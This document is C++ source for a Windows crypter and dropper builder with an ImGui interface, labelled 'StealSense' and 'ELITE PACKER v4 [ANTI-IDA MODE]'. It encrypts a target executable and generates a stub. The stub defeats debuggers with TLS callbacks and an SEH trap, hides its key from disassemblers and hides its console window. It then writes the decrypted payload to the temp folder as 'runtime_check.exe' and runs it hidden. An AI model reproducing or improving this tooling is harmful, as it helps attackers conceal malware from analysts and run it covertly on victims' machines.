#include "protector.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <sstream>
#include <filesystem>
#include <ctime>
#include "../imgui/imgui.h"

namespace Protector {
    
    char inputPath[256] = "C:\\Target\\Application.exe";
    char outputPath[256] = "StealSense_Protected.cpp";
    char encryptionKey[64] = "HiddenKey"; 
    
    bool optTls = true;
    bool optSeh = true;
    bool optDynamicKey = true;

    void EncryptPayload(std::vector<unsigned char>& data, const std::string& key) {
        if (key.empty()) return;
        unsigned char last = 0x55;
        for (size_t i = 0; i < data.size(); ++i) {
            unsigned char k = key[i % key.length()];
            data[i] = (data[i] ^ k) ^ last;
            last = data[i];
        }
    }

    bool ProtectExecutable(const std::string& inputFile, const std::string& outputFile) {
        srand((unsigned int)time(0));

        std::ifstream file(inputFile, std::ios::binary);
        if (!file) return false;
        std::vector<unsigned char> content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        std::string sKey = encryptionKey;
        EncryptPayload(content, sKey);

        std::ofstream out(outputFile);
        if (!out) return false;

        out << "// [StealSense Anti-Reverse Engineering Stub]\n";
        out << "#include <windows.h>\n";
        out << "#include <iostream>\n";
        out << "#include <vector>\n";
        out << "#include <fstream>\n\n";

        if (optTls) {
            out << R"(
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        if (IsDebuggerPresent()) ExitProcess(0);
    }
}
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:p_tls_callback")
#pragma data_seg (".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback = TlsCallback;
#pragma data_seg ()
)";
        }

        if (optSeh) {
            out << R"(
bool CheckSEH() {
    __try {
        RaiseException(DBG_CONTROL_C, 0, 0, NULL);
        return true; 
    }
    __except(GetExceptionCode() == DBG_CONTROL_C ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        return false;
    }
    return true; 
}
)";
        }

        out << "std::string GetKeyRuntime() {\n";
        out << "    char k[" << sKey.length() + 1 << "];\n";
        for (size_t i = 0; i < sKey.length(); i++) {
            int safeVal = (int)sKey[i];
            int magic = rand() % 255;
            int xorVal = safeVal ^ magic;
            out << "    k[" << i << "] = " << xorVal << " ^ " << magic << ";\n";
        }
        out << "    k[" << sKey.length() << "] = '\\0';\n";
        out << "    return std::string(k);\n";
        out << "}\n\n";

        out << R"(
void Decrypt(unsigned char* data, size_t size, std::string key) {
    unsigned char last = 0x55;
    size_t keyLen = key.length();
    unsigned char prev = 0x55;
    for (size_t i = 0; i < size; ++i) {
        unsigned char cur = data[i];
        unsigned char k = key[i % keyLen];
        data[i] = (cur ^ prev) ^ k;
        prev = cur;
    }
}
)";

        out << "unsigned char PAYLOAD[] = {";
        for (size_t i = 0; i < content.size(); ++i) {
            if (i % 20 == 0) out << "\n    ";
            out << "0x" << std::hex << (int)content[i] << ", ";
        }
        out << "\n};\n\n";

        out << "int main() {\n";
        out << "    ShowWindow(GetConsoleWindow(), SW_HIDE);\n";

        if (optSeh) {
            out << "    if (CheckSEH()) { return -1; }\n";
        }

        out << "    std::string dynamicKey = GetKeyRuntime();\n";
        
        out << "    Decrypt(PAYLOAD, sizeof(PAYLOAD), dynamicKey);\n";
        
        out << R"(
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string path = std::string(tempPath) + "runtime_check.exe";
    std::ofstream f(path, std::ios::binary);
    f.write((char*)PAYLOAD, sizeof(PAYLOAD));
    f.close();
    ShellExecuteA(NULL, NULL, path.c_str(), NULL, NULL, SW_HIDE);
)";
        out << "    return 0;\n";
        out << "}\n";

        out.close();
        return true;
    }

    void Render() {
        ImGui::TextColored(ImVec4(1.0f, 0.0f, 0.0f, 1.0f), "ELITE PACKER v4 [ANTI-IDA MODE]");
        ImGui::Separator();
        
        ImGui::InputText("Target File", inputPath, IM_ARRAYSIZE(inputPath));
        ImGui::InputText("Enc Key (Will be Hidden)", encryptionKey, IM_ARRAYSIZE(encryptionKey));
        
        ImGui::Spacing();
        ImGui::Checkbox("Stack Strings (Hide Key from IDA)", &optDynamicKey);
        ImGui::Checkbox("SEH Trap (Exception Handling Anti-Debug)", &optSeh);
        ImGui::Checkbox("TLS Callbacks", &optTls);
        
        if (ImGui::Button("BUILD PROTECTED STUB", ImVec2(-1, 50))) {
            if (ProtectExecutable(inputPath, outputPath)) {
            }
        }
        ImGui::TextDisabled("Output: %s", outputPath);
    }
}
